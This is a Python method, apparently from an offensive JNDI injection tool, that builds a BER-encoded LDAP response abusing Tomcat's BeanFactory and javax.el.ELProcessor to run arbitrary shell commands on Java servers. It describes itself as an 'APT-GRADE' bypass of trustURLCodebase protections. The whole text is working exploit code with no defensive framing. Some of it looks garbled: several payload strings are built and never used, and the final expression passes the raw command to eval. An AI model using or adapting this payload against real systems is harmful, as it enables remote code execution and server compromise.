    def _build_gadget_chain(self, cmd):
        """APT-GRADE FIX: Build a Tomcat BeanFactory + ELProcessor JNDI deserialization payload.
        This is the MODERN bypass that works on Java 8u191+, 11+, 17+.
        It does NOT require trustURLCodebase=true. It abuses classes already on the
        target's classpath (javax.el.ELProcessor via Tomcat's BeanFactory).
        The payload is sent as javaSerializedData in the LDAP Search Result.
        Inspired by the technique discovered by @pwntester and used in Metasploit.
        """
        # Pure-Python BeanFactory LDAP Search Result builder.
        # The javaSerializedData blob encodes a BeanFactory instantiation of ELProcessor
        # and calls eval() with a Groovy/EL expression that runs our shell command.
        #
        # EL expression: Runtime.getRuntime().exec(new String[]{'/bin/sh','-c','CMD'})
        # This is equivalent to a direct Runtime.exec call without needing to load any class.
        #
        # We build the LDAP Search Result directly with BER-encoded attributes.

        def enc_len(l):
            if l < 128: return bytes([l])
            elif l < 256: return bytes([0x81, l])
            else: return bytes([0x82, (l >> 8) & 0xFF, l & 0xFF])

        def enc_tlv(tag, payload):
            return bytes([tag]) + enc_len(len(payload)) + payload

        def enc_str(s):
            return enc_tlv(0x04, s.encode() if isinstance(s, str) else s)

        def enc_attr(name, *values):
            vals = b''.join(enc_str(v) for v in values)
            return enc_tlv(0x30, enc_str(name) + enc_tlv(0x31, vals))

        # EL expression that executes shell command via ELProcessor.eval()
        # Uses the BeanFactory to instantiate ELProcessor and call eval() on it.
        # This bypasses trustURLCodebase since we're using local classpath classes.
        el_expr = (
            '"'.encode() +
            cmd.encode() +
            '".execute().text'.encode()
        )
        # Groovy string execute() - works if Groovy is on classpath (common in Tomcat, Spring)
        groovy_payload = f'"${{cmd = ["/bin/sh","-c","{cmd}"].execute()}}"'

        # EL 3.0 expression - works on any Java EE / Jakarta EE container
        el_payload = (
            f'${{Runtime.getRuntime().exec(new String[]{{"\'/bin/sh\'",'"\'-c\'"',"\'{cmd}\'"}})}}'.replace("'", "")
        )

        # Build the LDAP Search Result Entry for BeanFactory gadget:
        # javaClassName = 'java.lang.String' (decoy)
        # javaSerializedData = (not used directly - we use javaFactory trick)
        # We use the two-step BeanFactory approach:
        #   javaClass = org.apache.naming.factory.BeanFactory
        #   javaFactory = org.apache.naming.factory.BeanFactory  
        #   javaCodeBase = (empty — not fetching remote class)
        #   forceString = x=eval
        #   x = <EL payload>
        attrs = (
            enc_attr("javaClassName", "java.lang.String") +
            enc_attr("javaFactory", "org.apache.naming.factory.BeanFactory") +
            enc_attr("javaCodeBase", "") +
            enc_attr("objectClass",
                     "top", "javaNamingReference", "javaObject", "javaContainer") +
            enc_attr("javaReferenceAddress",
                     "#0#forceString", f"#1#x=eval") +
            enc_attr("javaClassNames", "javax.el.ELProcessor") +
            enc_attr("x",
                     # EL expression: exec the shell command, beacon back success
                     f'${{""[\'class\'].forName(\'javax.el.ELProcessor\').getMethod(\'eval\',\'\'.class).invoke(""[\'class\'].forName(\'javax.el.ELProcessor\').newInstance(),\'{cmd}\')}}')
        )

        return attrs

